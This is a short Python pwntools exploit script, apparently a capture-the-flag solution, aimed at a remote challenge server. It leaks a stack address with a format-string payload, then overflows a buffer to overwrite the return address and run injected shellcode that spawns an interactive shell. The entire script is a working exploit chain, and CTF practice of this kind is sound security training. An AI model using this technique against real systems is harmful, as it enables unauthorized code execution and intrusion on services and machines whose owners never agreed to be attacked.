from pwn import *

context.arch = 'amd64'

# p = process("./all/src/all")
p = remote("all.chal.cyberjousting.com", 1348)

# we need to leak RBP first
payload1 = b'%lx'
p.sendline(payload1)
leak = p.recvline()[:-1]
leak = leak.decode()
leak = int(leak, 16)
# p.recv(1024)

payload = b'quit' + b'\x00' + b'a' * 0x23
rip = leak + 0x28 + 0x8
rip = rip.to_bytes(8, byteorder="little")
payload += rip
sc = asm(shellcraft.sh())
payload += sc

p.sendline(payload)
p.interactive()